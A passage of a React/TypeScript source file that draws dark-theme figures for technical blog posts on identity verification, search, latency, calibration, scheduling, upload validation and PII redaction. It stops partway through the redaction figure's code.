// Still figures for blog posts, rendered with `npm run figures`. Each one shows the article's central result,
// using the numbers from that article's tested code. 1600x900, the site's dark theme.
import type { ReactNode } from "react";
import { Stage, color, mono, serif, sans } from "./theme";

export const FIG_W = 1600;
export const FIG_H = 900;

function Frame({ kicker, title, children }: { kicker: string; title: string; children: ReactNode }) {
  return (
    <Stage>
      <div style={{ position: "absolute", left: 72, top: 56, right: 72 }}>
        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 14,
            fontFamily: mono,
            fontSize: 20,
            letterSpacing: 3,
            color: color.muted,
            textTransform: "uppercase",
          }}
        >
          <span style={{ width: 28, height: 2, background: color.accent }} />
          {kicker}
        </div>
        <div style={{ marginTop: 14, fontFamily: serif, fontSize: 50, lineHeight: 1.12, color: color.ink }}>{title}</div>
      </div>
      <div style={{ position: "absolute", left: 72, right: 72, top: 230, bottom: 90 }}>{children}</div>
    </Stage>
  );
}

const Tick = () => <span style={{ color: color.accent, fontWeight: 700 }}>✓</span>;
const Cross = () => <span style={{ color: color.warm, fontWeight: 700 }}>✗</span>;
const Partial = () => <span style={{ color: color.muted, fontWeight: 700 }}>~</span>;

/* 1. OCR vs NFC ----------------------------------------------------------------------------------------- */
export function FigOcrVsNfc() {
  const rows: [string, ReactNode, ReactNode][] = [
    ["Catches typos and OCR misreads", <Tick />, <Tick />],
    ["Detects an edited data page", <Partial />, <Tick />],
    ["Detects a swapped photo", <Partial />, <Tick />],
    ["Proves the issuing country signed it", <Cross />, <Tick />],
    ["Detects a cloned chip", <Cross />, <Tick />],
    ["Works on every document and phone", <Tick />, <Cross />],
  ];
  const cell = { display: "flex", alignItems: "center", justifyContent: "center", fontSize: 38 } as const;
  return (
    <Frame kicker="Passport verification" title="What OCR proves, and what only the chip can">
      <div style={{ display: "grid", gridTemplateColumns: "1fr 260px 260px", fontFamily: sans }}>
        <div />
        <div style={{ ...cell, fontSize: 24, color: color.muted, paddingBottom: 18 }}>OCR of the page</div>
        <div style={{ ...cell, fontSize: 24, color: color.accent, paddingBottom: 18 }}>NFC chip read</div>
        {rows.map(([label, a, b]) => (
          <div key={label} style={{ display: "contents" }}>
            <div style={{ fontSize: 30, color: color.ink, padding: "17px 0", borderTop: `1px solid ${color.line}` }}>{label}</div>
            <div style={{ ...cell, borderTop: `1px solid ${color.line}` }}>{a}</div>
            <div style={{ ...cell, borderTop: `1px solid ${color.line}`, background: color.accentDim }}>{b}</div>
          </div>
        ))}
      </div>
      <div style={{ marginTop: 18, fontSize: 21, color: color.faint, fontFamily: sans }}>
        ~ only by image forensics, imperfectly · cloned chips need active or chip authentication
      </div>
    </Frame>
  );
}

/* 2. KYC data retention ---------------------------------------------------------------------------------- */
export function FigKycRetention() {
  const x = (yr: number) => 40 + yr * 150; // years from application
  const bar = (from: number, to: number, y: number, fill: string, label: string, sub: string) => (
    <g>
      <rect x={x(from)} y={y} width={x(to) - x(from)} height={56} rx={8} fill={fill} />
      <text x={x(from) + 18} y={y + 36} fill={color.bg} fontSize={24} fontFamily={sans} fontWeight={600}>
        {label}
      </text>
      <text x={x(to) + 16} y={y + 36} fill={color.muted} fontSize={22} fontFamily={sans}>
        {sub}
      </text>
    </g>
  );
  const marks: [number, string][] = [
    [0, "Sign-up"],
    [3, "Account closed"],
    [8, "Closed + 5 years"],
  ];
  return (
    <Frame kicker="KYC data retention (example policy)" title="Photos go early; identity records stay for years">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {bar(0, 0.25, 60, color.warm, "", "Selfie, ID photos, video: deleted ~30 days after the decision")}
        {bar(0, 8, 190, color.accent, "Identity record and decision log", "")}
        <rect x={x(3)} y={190} width={x(8) - x(3)} height={56} rx={0} fill="rgba(17,18,19,0.35)" />
        {bar(0, 0.25, 320, color.faint, "", "Abandoned application: deleted after ~30 days")}
        <line x1={x(0)} x2={x(9.2)} y1={440} y2={440} stroke={color.line} strokeWidth={2} />
        {marks.map(([yr, label]) => (
          <g key={label}>
            <line x1={x(yr)} x2={x(yr)} y1={40} y2={450} stroke={color.line} strokeDasharray="6 8" />
            <text x={x(yr)} y={485} fill={color.ink} fontSize={24} fontFamily={sans} textAnchor={yr === 0 ? "start" : "middle"}>
              {label}
            </text>
          </g>
        ))}
        <text x={x(5.5)} y={226} fill={color.ink} fontSize={22} fontFamily={sans} textAnchor="middle">
          kept while a customer, then 5 years (FATF minimum)
        </text>
        <text x={x(0)} y={530} fill={color.faint} fontSize={20} fontFamily={sans}>
          Legal holds pause every deletion. Real periods vary by country and regulator.
        </text>
      </svg>
    </Frame>
  );
}

/* 3. Liveness certification (APCER per species) ------------------------------------------------------ */
export function FigLivenessApcer() {
  const bars: [string, number][] = [
    ["Printed photo", 0],
    ["Screen replay", 2],
    ["Paper mask", 0],
  ];
  const y = (pct: number) => 420 - pct * 150;
  return (
    <Frame kicker="Liveness testing · ISO/IEC 30107-3" title="Pooling attacks hides the one that gets through">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {[0, 1, 2].map((p) => (
          <g key={p}>
            <line x1={120} x2={1000} y1={y(p)} y2={y(p)} stroke={color.line} />
            <text x={100} y={y(p) + 8} fill={color.muted} fontSize={22} fontFamily={mono} textAnchor="end">
              {p}%
            </text>
          </g>
        ))}
        {bars.map(([label, pct], i) => {
          const cx = 250 + i * 290;
          return (
            <g key={label}>
              <rect
                x={cx - 70}
                y={y(pct) - (pct ? 0 : 4)}
                width={140}
                height={pct ? 420 - y(pct) : 4}
                rx={6}
                fill={pct ? color.warm : color.accent}
              />
              <text x={cx} y={y(pct) - 22} fill={pct ? color.warm : color.ink} fontSize={30} fontFamily={mono} textAnchor="middle">
                {pct}%
              </text>
              <text x={cx} y={466} fill={color.ink} fontSize={24} fontFamily={sans} textAnchor="middle">
                {label}
              </text>
            </g>
          );
        })}
        <line x1={120} x2={1000} y1={y(0.67)} y2={y(0.67)} stroke={color.ink} strokeWidth={3} strokeDasharray="10 10" />
        <text x={790} y={y(0.67) - 14} fill={color.ink} fontSize={22} fontFamily={sans}>
          all attacks pooled: 0.67%
        </text>
        <text x={1080} y={150} fill={color.ink} fontSize={30} fontFamily={sans}>
          Report the worst species:
        </text>
        <text x={1080} y={200} fill={color.warm} fontSize={44} fontFamily={mono}>
          APCER 2%
        </text>
        <text x={1080} y={270} fill={color.ink} fontSize={30} fontFamily={sans}>
          with genuine users rejected
        </text>
        <text x={1080} y={320} fill={color.accent} fontSize={44} fontFamily={mono}>
          BPCER 5%
        </text>
        <text x={1080} y={380} fill={color.muted} fontSize={22} fontFamily={sans}>
          at the same threshold
        </text>
        <text x={120} y={530} fill={color.faint} fontSize={20} fontFamily={sans}>
          Attack acceptance per species, 150 attacks each, 300 genuine attempts.
        </text>
      </svg>
    </Frame>
  );
}

/* 4. HNSW vs cosine: recall vs share scanned ------------------------------------------------------------ */
export function FigAnnRecall() {
  const pts: [number, number, string][] = [
    [0.5, 0.69, "1 probe"],
    [1.6, 0.81, "4"],
    [6.3, 0.89, "16"],
    [25, 0.97, "64"],
    [100, 1, "exact"],
  ];
  const X0 = 140,
    X1 = 1120,
    Y0 = 460,
    Y1 = 40;
  const lx = (p: number) => X0 + ((Math.log10(p) - Math.log10(0.4)) / (Math.log10(100) - Math.log10(0.4))) * (X1 - X0);
  const ly = (r: number) => Y0 - ((r - 0.6) / 0.4) * (Y0 - Y1);
  const path = pts.map(([p, r], i) => `${i ? "L" : "M"}${lx(p)},${ly(r)}`).join(" ");
  return (
    <Frame kicker="Exact vs approximate vector search" title="Scan less of the index, miss some true neighbours">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {[0.6, 0.7, 0.8, 0.9, 1].map((r) => (
          <g key={r}>
            <line x1={X0} x2={X1} y1={ly(r)} y2={ly(r)} stroke={color.line} />
            <text x={X0 - 16} y={ly(r) + 8} fill={color.muted} fontSize={22} fontFamily={mono} textAnchor="end">
              {r.toFixed(1)}
            </text>
          </g>
        ))}
        {[0.5, 1, 5, 25, 100].map((p) => (
          <text key={p} x={lx(p)} y={Y0 + 40} fill={color.muted} fontSize={22} fontFamily={mono} textAnchor="middle">
            {p}%
          </text>
        ))}
        <text x={(X0 + X1) / 2} y={Y0 + 82} fill={color.ink} fontSize={24} fontFamily={sans} textAnchor="middle">
          share of vectors scored per query (log scale)
        </text>
        <text x={40} y={ly(0.8)} fill={color.ink} fontSize={24} fontFamily={sans} transform={`rotate(-90 40 ${ly(0.8)})`} textAnchor="middle">
          recall@10
        </text>
        <path d={path} fill="none" stroke={color.accent} strokeWidth={5} />
        {pts.map(([p, r, label]) => (
          <g key={label}>
            <circle cx={lx(p)} cy={ly(r)} r={10} fill={label === "exact" ? color.ink : color.accent} />
            <text x={lx(p) + 16} y={ly(r) + 36} fill={color.ink} fontSize={22} fontFamily={mono}>
              {r.toFixed(2)}
            </text>
          </g>
        ))}
        <text x={1170} y={170} fill={color.ink} fontSize={28} fontFamily={sans}>
          Cosine is the metric.
        </text>
        <text x={1170} y={210} fill={color.ink} fontSize={28} fontFamily={sans}>
          The index decides
        </text>
        <text x={1170} y={250} fill={color.ink} fontSize={28} fontFamily={sans}>
          how many vectors
        </text>
        <text x={1170} y={290} fill={color.ink} fontSize={28} fontFamily={sans}>
          get scored at all.
        </text>
        <text x={1170} y={360} fill={color.muted} fontSize={22} fontFamily={sans}>
          50,000 vectors, 128 dims,
        </text>
        <text x={1170} y={392} fill={color.muted} fontSize={22} fontFamily={sans}>
          IVF index, 200 queries
        </text>
      </svg>
    </Frame>
  );
}

/* 5. p50 / p90 / p99 ------------------------------------------------------------------------------------- */
export function FigLatencyPercentiles() {
  const X0 = 100,
    X1 = 900,
    base = 430;
  const lx = (ms: number) => X0 + ((Math.log10(ms) - Math.log10(50)) / (Math.log10(8000) - Math.log10(50))) * (X1 - X0);
  // Shape of the test data: a tall lognormal around 120 ms and a small one around 2,500 ms (2% of requests).
  const curve = (mu: number, sigma: number, peak: number) =>
    Array.from({ length: 120 }, (_, i) => {
      const ms = 50 * Math.pow(8000 / 50, i / 119);
      const z = (Math.log(ms) - Math.log(mu)) / sigma;
      return [lx(ms), base - peak * Math.exp(-0.5 * z * z)] as const;
    });
  const area = (pts: readonly (readonly [number, number])[]) =>
    `M${pts[0][0]},${base} ` + pts.map(([x, y]) => `L${x},${y}`).join(" ") + ` L${pts[pts.length - 1][0]},${base} Z`;
  const markers: [string, number, string][] = [
    ["p50", 121, color.accent],
    ["mean", 179, color.muted],
    ["p90", 193, color.ink],
    ["p99", 2485, color.warm],
  ];
  return (
    <Frame kicker="Latency percentiles" title="p50 is the typical request; p99 is a different world">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        <path d={area(curve(120, 0.35, 330))} fill={color.accentDim} stroke={color.accent} strokeWidth={3} />
        <path d={area(curve(2500, 0.4, 40))} fill={color.warmDim} stroke={color.warm} strokeWidth={3} />
        <line x1={X0} x2={X1} y1={base} y2={base} stroke={color.line} strokeWidth={2} />
        {[50, 100, 500, 1000, 5000].map((ms) => (
          <text key={ms} x={lx(ms)} y={base + 36} fill={color.muted} fontSize={20} fontFamily={mono} textAnchor="middle">
            {ms >= 1000 ? `${ms / 1000}s` : `${ms}ms`}
          </text>
        ))}
        {markers.map(([label, ms, c], i) => (
          <g key={label}>
            <line
              x1={lx(ms)}
              x2={lx(ms)}
              y1={60 + i * 34}
              y2={base}
              stroke={c}
              strokeWidth={2}
              strokeDasharray={label === "mean" ? "6 6" : undefined}
            />
            <text
              x={lx(ms) + (label === "p50" ? -10 : 10)}
              y={56 + i * 34}
              fill={c}
              fontSize={22}
              fontFamily={mono}
              textAnchor={label === "p50" ? "end" : "start"}
            >{`${label} ${ms.toLocaleString("en")} ms`}</text>
          </g>
        ))}
        <text x={X0} y={base + 90} fill={color.faint} fontSize={20} fontFamily={sans}>
          10,000 requests; 2% hit a slow path (cold cache, retries, GC)
        </text>
        <text x={990} y={80} fill={color.ink} fontSize={28} fontFamily={sans}>
          One action, many calls:
        </text>
        {[
          [1, "1.0%"],
          [5, "4.9%"],
          [20, "18.2%"],
          [100, "63.4%"],
        ].map(([n, pct], i) => (
          <g key={String(n)}>
            <text x={990} y={140 + i * 60} fill={color.muted} fontSize={24} fontFamily={mono}>{`${n} call${n === 1 ? "" : "s"}`}</text>
            <rect x={1130} y={118 + i * 60} width={(parseFloat(String(pct)) / 63.4) * 220} height={28} rx={4} fill={color.warm} />
            <text x={1130 + (parseFloat(String(pct)) / 63.4) * 220 + 10} y={140 + i * 60} fill={color.ink} fontSize={22} fontFamily={mono}>
              {pct}
            </text>
          </g>
        ))}
        <text x={990} y={400} fill={color.muted} fontSize={20} fontFamily={sans}>
          of actions hit a call slower than p99
        </text>
      </svg>
    </Frame>
  );
}

/* 6. EXIF orientation ------------------------------------------------------------------------------------- */
function IdCard({ rotate, dim }: { rotate: number; dim?: boolean }) {
  return (
    <div
      style={{
        width: 300,
        height: 190,
        transform: `rotate(${rotate}deg)`,
        background: color.paper,
        borderRadius: 14,
        position: "relative",
        opacity: dim ? 0.85 : 1,
      }}
    >
      <div style={{ position: "absolute", left: 0, right: 0, top: 0, height: 34, background: "#2f6e5e", borderRadius: "14px 14px 0 0" }} />
      <div style={{ position: "absolute", left: 18, top: 50, width: 74, height: 96, background: "#b9ae97", borderRadius: 6 }} />
      {[0, 1, 2, 3].map((i) => (
        <div
          key={i}
          style={{ position: "absolute", left: 110, top: 56 + i * 24, width: 160 - i * 22, height: 10, background: color.paperLine, borderRadius: 3 }}
        />
      ))}
      <div
        style={{ position: "absolute", left: 18, right: 18, bottom: 14, height: 10, background: color.paperMuted, borderRadius: 3, opacity: 0.6 }}
      />
    </div>
  );
}
export function FigExifOrientation() {
  const panel = (title: string, sub: string, card: ReactNode, tone: string) => (
    <div style={{ width: 420, display: "flex", flexDirection: "column", alignItems: "center", gap: 22 }}>
      <div
        style={{
          height: 330,
          width: 420,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          border: `1px solid ${color.line}`,
          borderRadius: 16,
          background: color.surface,
        }}
      >
        {card}
      </div>
      <div style={{ fontFamily: sans, fontSize: 28, color: tone }}>{title}</div>
      <div style={{ fontFamily: mono, fontSize: 20, color: color.muted, textAlign: "center" }}>{sub}</div>
    </div>
  );
  const arrow = <div style={{ fontSize: 56, color: color.faint, marginTop: 140 }}>→</div>;
  return (
    <Frame kicker="Phone photos and OCR" title="The viewer rotates the photo. OCR doesn't.">
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
        {panel("Stored by the phone", "sensor pixels + Orientation: 6", <IdCard rotate={-90} />, color.ink)}
        {arrow}
        {panel("What a photo viewer shows", "applies the tag: upright", <IdCard rotate={0} />, color.accent)}
        {arrow}
        {panel("What OCR reads", "ignores the tag: sideways text", <IdCard rotate={-90} dim />, color.warm)}
      </div>
      <div style={{ marginTop: 40, fontFamily: sans, fontSize: 26, color: color.ink }}>
        Fix: <span style={{ fontFamily: mono, color: color.accent }}>ImageOps.exif_transpose(img)</span> before anything else reads the pixels.
      </div>
    </Frame>
  );
}

/* 7. asyncio: timeout inside vs outside the semaphore ---------------------------------------------------- */
export function FigAsyncioTimeout() {
  const ms = (t: number) => 230 + t * 7.2; // 1 ms = 7.2 px
  const lane = (y: number, label: string, wait: number, work: number, timeout: number, insideFirst: boolean) => {
    const killed = insideFirst ? false : wait + work > timeout;
    return (
      <g key={label}>
        <text x={210} y={y + 30} fill={color.muted} fontSize={22} fontFamily={mono} textAnchor="end">
          {label}
        </text>
        {wait > 0 && <rect x={ms(0)} y={y} width={wait * 7.2} height={44} rx={6} fill={color.surface} stroke={color.line} />}
        {wait > 0 && wait * 7.2 > 110 && (
          <text x={ms(wait / 2)} y={y + 30} fill={color.faint} fontSize={20} fontFamily={sans} textAnchor="middle">
            waiting for a slot
          </text>
        )}
        {!killed && <rect x={ms(wait)} y={y} width={work * 7.2} height={44} rx={6} fill={color.accent} />}
        {killed && wait < timeout && (
          <rect x={ms(wait)} y={y} width={(timeout - wait) * 7.2} height={44} rx={6} fill={color.warmDim} stroke={color.warm} />
        )}
        {killed && (
          <text x={ms(timeout) + 14} y={y + 30} fill={color.warm} fontSize={22} fontFamily={sans}>
            {wait >= timeout ? "TimeoutError before it started" : "TimeoutError mid-work"}
          </text>
        )}
        <line
          x1={ms((insideFirst ? wait : 0) + timeout)}
          x2={ms((insideFirst ? wait : 0) + timeout)}
          y1={y - 6}
          y2={y + 50}
          stroke={color.warm}
          strokeWidth={3}
        />
      </g>
    );
  };
  return (
    <Frame kicker="Python asyncio · Semaphore(2), 30 ms of work, 50 ms timeout" title="Start the timeout after the slot, not before">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        <text x={230} y={30} fill={color.warm} fontSize={26} fontFamily={sans}>
          Timeout outside the semaphore: 8 of 10 time out
        </text>
        {[0, 30, 60].map((w, i) => lane(55 + i * 62, `task ${i + 1}`, w, 30, 50, false))}
        <text x={230} y={290} fill={color.accent} fontSize={26} fontFamily={sans}>
          Timeout inside the semaphore: all 10 finish
        </text>
        {[0, 30, 60].map((w, i) => lane(315 + i * 62, `task ${i + 1}`, w, 30, 50, true))}
        {[0, 50, 100, 150].map((t) => (
          <text key={t} x={ms(t)} y={530} fill={color.faint} fontSize={20} fontFamily={mono} textAnchor="middle">
            {t} ms
          </text>
        ))}
        <line x1={1180} x2={1180} y1={12} y2={40} stroke={color.warm} strokeWidth={3} />
        <text x={1194} y={34} fill={color.warm} fontSize={20} fontFamily={sans}>
          timeout deadline
        </text>
      </svg>
    </Frame>
  );
}

/* 8. Idempotency keys ----------------------------------------------------------------------------------- */
export function FigIdempotencyKeys() {
  const rows: [string, string, string, string][] = [
    ["First request", "key k1, amount 500", "runs the charge, stores the response", "201"],
    ["Retry after a timeout", "key k1, amount 500", "replays the stored response, no new charge", "201"],
    ["Same key, new body", "key k1, amount 900", "rejected: a client bug, not a retry", "422"],
    ["Double-click", "key k2, twice at once", "one runs; the other is told to wait", "409"],
    ["Provider down", "key k3", "key released so the retry can really run", "503"],
  ];
  const tone = (code: string) => (code === "201" ? color.accent : code === "503" ? color.muted : color.warm);
  return (
    <Frame kicker="POST /charges with an Idempotency-Key" title="Retry as often as you like; charge once">
      <div style={{ display: "grid", gridTemplateColumns: "300px 330px 1fr 110px", fontFamily: sans, rowGap: 0 }}>
        {rows.map(([what, req, result, code]) => (
          <div key={what} style={{ display: "contents" }}>
            <div style={{ fontSize: 27, color: color.ink, padding: "20px 0", borderTop: `1px solid ${color.line}` }}>{what}</div>
            <div style={{ fontSize: 22, color: color.muted, fontFamily: mono, padding: "24px 0", borderTop: `1px solid ${color.line}` }}>{req}</div>
            <div style={{ fontSize: 25, color: color.ink, padding: "21px 0", borderTop: `1px solid ${color.line}` }}>{result}</div>
            <div
              style={{
                fontSize: 30,
                color: tone(code),
                fontFamily: mono,
                padding: "18px 0",
                borderTop: `1px solid ${color.line}`,
                textAlign: "right",
              }}
            >
              {code}
            </div>
          </div>
        ))}
      </div>
    </Frame>
  );
}

/* 9. Calibration ----------------------------------------------------------------------------------------- */
export function FigCalibration() {
  const before: [number, number][] = [
    [0.05, 0.2],
    [0.3, 0.41],
    [0.5, 0.51],
    [0.71, 0.61],
    [0.95, 0.81],
  ];
  const after: [number, number][] = [
    [0.11, 0.13],
    [0.3, 0.3],
    [0.5, 0.51],
    [0.7, 0.71],
    [0.89, 0.88],
  ];
  const plot = (x0: number, title: string, pts: [number, number][], ece: string, c: string) => {
    const S = 380,
      Y0 = 500;
    const px = (v: number) => x0 + v * S,
      py = (v: number) => Y0 - v * S;
    return (
      <g>
        <text x={x0} y={30} fill={c} fontSize={28} fontFamily={sans}>
          {title}
        </text>
        <text x={x0} y={70} fill={c} fontSize={26} fontFamily={mono}>
          {ece}
        </text>
        <rect x={x0} y={Y0 - S} width={S} height={S} fill="none" stroke={color.line} />
        <line x1={px(0)} y1={py(0)} x2={px(1)} y2={py(1)} stroke={color.faint} strokeWidth={2} strokeDasharray="8 8" />
        {pts.map(([pred, actual]) => (
          <g key={pred}>
            <line x1={px(pred)} y1={py(pred)} x2={px(pred)} y2={py(actual)} stroke={c} strokeWidth={2} opacity={0.6} />
            <circle cx={px(pred)} cy={py(actual)} r={11} fill={c} />
          </g>
        ))}
        <text x={x0 + S / 2} y={Y0 + 38} fill={color.muted} fontSize={20} fontFamily={sans} textAnchor="middle">
          predicted probability
        </text>
        {[0, 0.5, 1].map((v) => (
          <text key={v} x={x0 - 12} y={py(v) + 7} fill={color.muted} fontSize={18} fontFamily={mono} textAnchor="end">
            {v}
          </text>
        ))}
      </g>
    );
  };
  return (
    <Frame kicker="Model calibration" title="A score of 0.95 should be right 95% of the time">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {plot(90, "Overconfident model", before, "ECE 0.126", color.warm)}
        {plot(620, "Temperature scaled (T = 2.44)", after, "ECE 0.011", color.accent)}
        <text x={1110} y={150} fill={color.ink} fontSize={26} fontFamily={sans}>
          Dots: how often each
        </text>
        <text x={1110} y={186} fill={color.ink} fontSize={26} fontFamily={sans}>
          score bin was right.
        </text>
        <text x={1110} y={240} fill={color.ink} fontSize={26} fontFamily={sans}>
          Dashed line: perfect
        </text>
        <text x={1110} y={276} fill={color.ink} fontSize={26} fontFamily={sans}>
          calibration.
        </text>
        <text x={1110} y={340} fill={color.muted} fontSize={22} fontFamily={sans}>
          The ranking is identical
        </text>
        <text x={1110} y={372} fill={color.muted} fontSize={22} fontFamily={sans}>
          in both, so AUC never
        </text>
        <text x={1110} y={404} fill={color.muted} fontSize={22} fontFamily={sans}>
          showed the problem.
        </text>
      </svg>
    </Frame>
  );
}

/* 10. Cancel on disconnect ------------------------------------------------------------------------------ */
export function FigCancelOnDisconnect() {
  const cut = 5 * 13.4 - 2;
  const tokens = (y: number, count: number, label: string, note: string) => (
    <g>
      <text x={0} y={y - 22} fill={color.ink} fontSize={26} fontFamily={sans}>
        {label}
      </text>
      {Array.from({ length: 100 }, (_, i) => (
        <rect key={i} x={i * 13.4} y={y} width={10} height={60} rx={2} fill={i < 5 ? color.accent : i < count ? color.warm : color.surface} />
      ))}
      <line x1={cut} x2={cut} y1={y - 8} y2={y + 68} stroke={color.ink} strokeWidth={3} />
      <text x={0} y={y + 104} fill={color.muted} fontSize={22} fontFamily={sans}>
        {note}
      </text>
    </g>
  );
  return (
    <Frame kicker="Streaming LLM proxy · user closes the tab after ~200 ms" title="Without an abort, the model keeps generating for nobody">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {tokens(70, 100, "Without AbortController", "User leaves after 5 tokens (white line); 95 more are generated and billed for nobody")}
        {tokens(330, 5, "With res.on('close') → controller.abort()", "The upstream request is cancelled: generation stops after 5 of 100 tokens")}
      </svg>
    </Frame>
  );
}

/* 11. SQLite FTS5 --------------------------------------------------------------------------------------- */
export function FigFts5Stemming() {
  const col = (x: number, head: string, sub: string, tone: string, rows: [string, string][]) => (
    <g>
      <text x={x} y={30} fill={tone} fontSize={30} fontFamily={mono}>
        {head}
      </text>
      <text x={x} y={66} fill={color.muted} fontSize={21} fontFamily={sans}>
        {sub}
      </text>
      {rows.map(([title, score], i) => (
        <g key={title + i}>
          <rect
            x={x}
            y={100 + i * 76}
            width={560}
            height={60}
            rx={10}
            fill={title.startsWith("(") ? "transparent" : color.surface}
            stroke={color.line}
            strokeDasharray={title.startsWith("(") ? "6 8" : undefined}
          />
          <text x={x + 22} y={139 + i * 76} fill={title.startsWith("(") ? color.faint : color.ink} fontSize={25} fontFamily={sans}>
            {title}
          </text>
          <text x={x + 538} y={139 + i * 76} fill={tone} fontSize={23} fontFamily={mono} textAnchor="end">
            {score}
          </text>
        </g>
      ))}
    </g>
  );
  return (
    <Frame kicker='SQLite FTS5 · query "refund"' title="Without stemming, refund doesn't find Refunds">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {col(0, "unicode61", "default tokenizer, 4 documents", color.warm, [
          ["Refund policy (title only)", "-0.0"],
          ["(missed: “…can’t process refunds”)", ""],
        ])}
        {col(720, "porter unicode61", "with stemming, 10 documents", color.accent, [
          ["Refund policy", "-2.156"],
          ["Café opening hours", "-1.041"],
        ])}
        <text x={0} y={330} fill={color.ink} fontSize={26} fontFamily={sans}>
          Two fixes the tests showed:
        </text>
        <text x={0} y={380} fill={color.muted} fontSize={24} fontFamily={sans}>
          1. Add the porter tokenizer, so refund, refunds and refunded match.
        </text>
        <text x={0} y={424} fill={color.muted} fontSize={24} fontFamily={sans}>
          2. Judge ranking on a realistic index: in 4 documents, common words score 0 and the order is arbitrary.
        </text>
        <text x={0} y={490} fill={color.faint} fontSize={21} fontFamily={sans}>
          bm25() scores: lower is better
        </text>
      </svg>
    </Frame>
  );
}

/* 12. Upload magic bytes --------------------------------------------------------------------------------- */
export function FigMagicBytes() {
  const rows: [string, string, string, string, boolean][] = [
    ["passport.jpg", "image/jpeg", "FF D8 FF E0", "JPEG: accepted", true],
    ["selfie.png", "image/png", "89 50 4E 47 0D 0A 1A 0A", "PNG: accepted", true],
    ["statement.pdf", "application/pdf", "25 50 44 46 2D", "%PDF-: accepted", true],
    ["passport.jpg", "image/jpeg", "3C 68 74 6D 6C 3E", "<html>: rejected", false],
    ["photo.png", "image/jpeg", "89 50 4E 47 0D 0A 1A 0A", "PNG declared as JPEG: rejected", false],
  ];
  return (
    <Frame kicker="Validating uploads" title="Trust the first bytes, not the name or Content-Type">
      <div style={{ display: "grid", gridTemplateColumns: "240px 290px 400px 1fr", fontFamily: sans }}>
        {["File name", "Content-Type sent", "First bytes", "Verdict"].map((h) => (
          <div key={h} style={{ fontSize: 21, color: color.muted, paddingBottom: 14, fontFamily: mono, letterSpacing: 1 }}>
            {h}
          </div>
        ))}
        {rows.map(([name, type, bytes, verdict, ok], i) => (
          <div key={i} style={{ display: "contents" }}>
            <div style={{ fontSize: 26, color: color.ink, padding: "20px 0", borderTop: `1px solid ${color.line}` }}>{name}</div>
            <div style={{ fontSize: 22, color: color.muted, fontFamily: mono, padding: "23px 0", borderTop: `1px solid ${color.line}` }}>{type}</div>
            <div
              style={{
                fontSize: 22,
                color: ok ? color.accent : color.warm,
                fontFamily: mono,
                padding: "23px 0",
                borderTop: `1px solid ${color.line}`,
              }}
            >
              {bytes}
            </div>
            <div style={{ fontSize: 25, color: ok ? color.ink : color.warm, padding: "20px 0", borderTop: `1px solid ${color.line}` }}>{verdict}</div>
          </div>
        ))}
      </div>
    </Frame>
  );
}

/* 13. DST scheduling --------------------------------------------------------------------------------------- */
export function FigDstSchedule() {
  const days = ["Fri 6 Mar", "Sat 7 Mar", "Sun 8 Mar", "Mon 9 Mar"];
  const naive = [9, 9, 10, 10];
  const X = (i: number) => 330 + i * 260;
  const Y = (h: number) => 120 + (h - 8.5) * 150;
  return (
    <Frame kicker="Daily job at 09:00 New York time · DST starts Sun 8 Mar 2026" title="Adding 24 hours in UTC drifts an hour with daylight saving">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {[9, 10].map((h) => (
          <g key={h}>
            <line x1={300} x2={1180} y1={Y(h)} y2={Y(h)} stroke={color.line} />
            <text
              x={280}
              y={Y(h) + 8}
              fill={color.muted}
              fontSize={24}
              fontFamily={mono}
              textAnchor="end"
            >{`${String(h).padStart(2, "0")}:00 local`}</text>
          </g>
        ))}
        <line x1={X(1.5)} x2={X(1.5)} y1={40} y2={360} stroke={color.faint} strokeDasharray="6 8" />
        <text x={X(1.5) + 10} y={52} fill={color.faint} fontSize={20} fontFamily={sans}>
          clocks spring forward
        </text>
        {days.map((d, i) => (
          <g key={d}>
            <text x={X(i)} y={400} fill={color.ink} fontSize={23} fontFamily={sans} textAnchor="middle">
              {d}
            </text>
            <circle cx={X(i)} cy={Y(naive[i])} r={14} fill={color.warm} />
            <circle cx={X(i)} cy={Y(9)} r={9} fill={color.accent} />
          </g>
        ))}
        <polyline points={days.map((_, i) => `${X(i)},${Y(naive[i])}`).join(" ")} fill="none" stroke={color.warm} strokeWidth={3} />
        <polyline points={days.map((_, i) => `${X(i)},${Y(9)}`).join(" ")} fill="none" stroke={color.accent} strokeWidth={3} />
        <circle cx={1230} cy={90} r={12} fill={color.warm} />
        <text x={1252} y={98} fill={color.ink} fontSize={22} fontFamily={sans}>
          first run + 24 h
        </text>
        <circle cx={1230} cy={140} r={9} fill={color.accent} />
        <text x={1252} y={148} fill={color.ink} fontSize={22} fontFamily={sans}>
          next local 09:00
        </text>
        <text x={0} y={470} fill={color.muted} fontSize={22} fontFamily={sans}>
          Edge cases: 02:30 doesn't exist on 8 Mar, so it runs at 03:30. 01:30 happens twice on 1 Nov; it runs once.
        </text>
        <text x={0} y={510} fill={color.faint} fontSize={20} fontFamily={sans}>
          Asia/Karachi has no DST, so a team in Lahore rarely sees this until it has customers abroad.
        </text>
      </svg>
    </Frame>
  );
}

/* 14. PII redaction ------------------------------------------------------------------------------------- */
export function FigPiiRedaction() {
  const rows: [string, string, "hit" | "kept"][] = [
    ["Customer ali@example.com uploaded CNIC 35202-1234567-1", "Customer [EMAIL] uploaded CNIC [CNIC]", "hit"],
    ["Card 4111 1111 1111 1111 declined", "Card [CARD] declined", "hit"],
    ["Payout to GB82 WEST 1234 5698 7654 32 failed", "Payout to [IBAN] failed", "hit"],
    ["Call +92 300 1234567 after 5pm", "Call [PHONE] after 5pm", "hit"],
    ["Order 1234567812345678 shipped", "kept: fails Luhn, so not a card", "kept"],
    ["Request 7f9c2a10-55e1-4c3b-9d1a… ok", "kept: request IDs stay usable", "kept"],
  ];
  const mark = (text: string) =>
    text.split(/(\[[A-Z]+\])/).map((part, i) =>
      /^\[[A-Z]+\]$/.test(part) ? (
        <span key={i} style={{ color: color.accent, background: color.accentDim, borderRadius: 6, padding: "1px 6px" }}>
